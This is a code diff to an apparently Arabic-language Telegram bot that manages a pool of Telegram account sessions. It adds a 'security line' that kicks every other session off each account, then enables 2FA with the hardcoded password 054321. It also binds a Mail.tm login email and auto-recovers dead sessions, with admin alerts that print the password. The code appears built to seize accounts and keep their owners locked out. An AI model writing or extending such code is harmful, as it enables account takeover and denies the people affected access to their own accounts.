@@ -102,16 +102,31 @@ async def _render_session_detail(callback: CallbackQuery, session):
     created_at = session["created_at"]
     two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
     valid_stat = "✅ نشطة" if session["valid"] else "❌ غير صالحة"
+    live = await session_manager.check_session_alive(phone)
+    live_stat = "🟢 متصلة الآن" if live else "🔴 غير متصلة الآن"
     login_mail = database.row_login_email(session) or "❌ غير مربوط"
     secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
     private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
+    kick_stage = session.get("auto_kick_stage")
+    if kick_stage is None:
+        kick_line = "—"
+    elif kick_stage >= 3:
+        kick_line = "✅ اكتمل الطرد"
+    elif kick_stage == 2:
+        kick_line = "⏳ طرد: إعادة كل 5 دقائق"
+    elif kick_stage == 1:
+        kick_line = "⏳ طرد: انتظار 24 ساعة"
+    else:
+        kick_line = "⏳ طرد: محاولة فورية"
     text = (
         f"📱 <code>{h(phone)}</code>\n\n"
         f"👤 الاسم: {h(full_name)}\n"
         f"🔖 اليوزر: @{h(username)}\n"
         f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
         f"📧 بريد Login: <code>{h(login_mail)}</code>\n"
-        f"📶 الحالة: {valid_stat}\n"
+        f"📶 قاعدة البيانات: {valid_stat}\n"
+        f"📡 فحص مباشر: {live_stat}\n"
+        f"🛡️ خط التأمين: {kick_line}\n"
         f"🔒 التأمين: {secured_stat}\n"
         f"⭐ الخصوصية: {private_stat}\n"
         f"📅 تاريخ التسجيل: {h(created_at)}"
@@ -480,6 +495,82 @@ async def _notify_new_session(
     )
 
 
+async def _on_admin_event(phone: str, event: str, **data):
+    """إشعارات تأمين / طرد / 2FA / إنعاش من session_manager."""
+    session = await database.get_session_by_phone(phone)
+    fname = session["full_name"] if session else "غير معروف"
+    base = f"📱 <code>{h(phone)}</code>\n👤 {h(fname)}\n\n"
+
+    if event == "security_started":
+        if data.get("email_ok"):
+            mail = f"📧 بريد: <code>{h(data.get('login_email', ''))}</code>"
+        else:
+            mail = f"⚠️ بريد: <code>{h(data.get('email_error', 'فشل'))}</code>"
+        text = (
+            base
+            + "🛡️ <b>بدء خط التأمين</b>\n"
+            + mail
+            + "\n\n⏳ الترتيب: طرد الجلسات → 2FA (054321) بعد نجاح الطرد"
+        )
+    elif event == "kick_started":
+        text = base + "🛡️ <b>بدء طرد الجلسات الأخرى</b>\n⏳ محاولة فورية أولاً..."
+    elif event == "kick_waiting":
+        hrs = int(data.get("seconds", 0)) // 3600
+        text = (
+            base
+            + f"⏳ <b>انتظار الطرد</b> ({data.get('phase', '')})\n"
+            + f"المحاولة التالية بعد <b>{hrs}</b> ساعة"
+        )
+    elif event == "kick_failed":
+        text = (
+            base
+            + f"⚠️ <b>فشل الطرد</b> — {h(data.get('phase', ''))}\n"
+            + f"<code>{h(data.get('error', ''))}</code>"
+        )
+    elif event == "kick_success":
+        text = base + f"✅ <b>نجح طرد الجلسات</b> ({h(data.get('phase', ''))})\n🔐 جاري تفعيل 2FA..."
+    elif event == "twofa_ok":
+        if data.get("skipped"):
+            text = base + "🔐 <b>2FA</b> — كان مضبوطاً مسبقاً (054321)"
+        else:
+            text = (
+                base
+                + "🔐 <b>تم تفعيل 2FA</b>\n"
+                + f"كلمة المرور: <code>{h(data.get('password', ''))}</code>"
+            )
+    elif event == "twofa_fail":
+        text = (
+            base
+            + "❌ <b>فشل تفعيل 2FA</b> بعد الطرد\n"
+            + f"<code>{h(data.get('error', ''))}</code>"
+        )
+    elif event == "email_retry_started":
+        text = base + "📧 <b>إعادة محاولة ربط بريد Login</b> (بعد 45 ثانية)..."
+    elif event == "email_retry_ok":
+        if data.get("skipped"):
+            text = base + f"📧 <b>بريد Login يعمل</b> — <code>{h(data.get('email', ''))}</code>"
+        else:
+            text = base + f"✅ <b>تم ربط البريد</b> — <code>{h(data.get('email', ''))}</code>"
+    elif event == "email_retry_fail":
+        text = base + f"❌ <b>فشل ربط البريد</b>\n<code>{h(data.get('error', ''))}</code>"
+    elif event == "email_retry_attempt_fail":
+        text = (
+            base
+            + f"⚠️ محاولة ربط بريد {data.get('attempt', '?')}/3 فشلت\n"
+            + f"<code>{h(data.get('error', ''))}</code>"
+        )
+    elif event == "recovery_skipped_alive":
+        text = base + "✅ <b>الجلسة عادت للعمل</b> — أُلغي الإنعاش المجدول"
+    elif event == "recovery_running":
+        text = base + "♻️ <b>جاري الإنعاش</b> — طلب كود من تيليجرام → Mail.tm"
+    elif event == "session_alive_again":
+        text = base + "✅ <b>الجلسة متصلة مجدداً</b> — أُلغي إنذار التوقف"
+    else:
+        return
+
+    await notify_admins(text + ADMIN_FOOTER, phone=phone)
+
+
 async def _on_recovery_done(phone: str, result: dict):
     session = await database.get_session_by_phone(phone)
     fname = session["full_name"] if session else "غير معروف"
@@ -583,9 +674,8 @@ async def retry_code(callback: CallbackQuery, state: FSMContext):
 # ──────────────────────────────────────────
 async def session_watchdog():
     """
-    كل ~30 ثانية: جلسة ماتت + بريد Login محفوظ → انتظار 5 دقائق → إنعاش تلقائي.
-    نجاح: إشعار «تم إحياء الجلسة». فشل: تصنيف غير صالحة + إشعار السبب.
-    """
+    كل ~30 ثانية: فحص الجلسات — فشلان متتاليان قبل إشعار التوقف.
+  """
     while True:
         await asyncio.sleep(30)
         try:
@@ -593,34 +683,38 @@ async def session_watchdog():
             for s in sessions:
                 if not s["valid"]:
                     continue
-                phone       = s["phone"]
-                still_valid = await session_manager.check_session_valid(phone)
-                if not still_valid:
-                    login_email = database.row_login_email(s)
-                    if login_email and s["email_password"]:
-                        if phone not in session_manager._recovery_scheduled:
-                            await notify_admins(
-                                f"⚠️ <b>الجلسة توقفت — جاري الإنعاش التلقائي</b>\n\n"
-                                f"📱 الرقم: <code>{h(phone)}</code>\n"
-                                f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
-                                f"⏳ بعد <b>{SESSION_RECOVERY_DELAY // 60}</b> دقائق: "
-                                f"طلب كود من تيليجرام → Mail.tm\n"
-                                f"📧 <code>{h(login_email)}</code>"
-                                + ADMIN_FOOTER,
-                                phone=phone,
-                            )
-                            session_manager.schedule_standard_recovery(
-                                phone, on_done=_on_recovery_done
-                            )
-                    else:
-                        await database.mark_session_invalid(phone)
-                        await notify_admins(
-                            f"❌ <b>جلسة غير صالحة</b>\n\n"
-                            f"📱 الرقم: <code>{h(phone)}</code>\n"
-                            f"⚠️ لا يوجد بريد Login — لا يمكن الإنعاش التلقائي."
-                            + ADMIN_FOOTER,
-                            phone=phone,
-                        )
+                phone = s["phone"]
+                alive = await session_manager.check_session_alive(phone)
+                action = session_manager.watchdog_session_check(phone, alive)
+                if action == "session_alive_again":
+                    await _on_admin_event(phone, "session_alive_again")
+                    continue
+                if action != "schedule_recovery":
+                    continue
+                login_email = database.row_login_email(s)
+                if login_email and s["email_password"]:
+                    await notify_admins(
+                        f"⚠️ <b>الجلسة توقفت — جاري الإنعاش التلقائي</b>\n\n"
+                        f"📱 الرقم: <code>{h(phone)}</code>\n"
+                        f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
+                        f"⏳ بعد <b>{SESSION_RECOVERY_DELAY // 60}</b> دقائق: "
+                        f"طلب كود من تيليجرام → Mail.tm\n"
+                        f"📧 <code>{h(login_email)}</code>"
+                        + ADMIN_FOOTER,
+                        phone=phone,
+                    )
+                    session_manager.schedule_standard_recovery(
+                        phone, on_done=_on_recovery_done
+                    )
+                else:
+                    await database.mark_session_invalid(phone)
+                    await notify_admins(
+                        f"❌ <b>جلسة غير صالحة</b>\n\n"
+                        f"📱 الرقم: <code>{h(phone)}</code>\n"
+                        f"⚠️ لا يوجد بريد Login — لا يمكن الإنعاش التلقائي."
+                        + ADMIN_FOOTER,
+                        phone=phone,
+                    )
         except Exception as e:
             logging.error(f"Watchdog: {e}")
 
@@ -1476,6 +1570,7 @@ async def main():
     await database.init_db()
     logging.info("database: %s (volume: %s)", database.DB_PATH, database.DATA_DIR)
     session_manager.set_recovery_callback(_on_recovery_done)
+    session_manager.set_admin_notify_callback(_on_admin_event)
     asyncio.ensure_future(session_watchdog())
     asyncio.ensure_future(_startup_email_migration())
     asyncio.ensure_future(_startup_session_recovery())
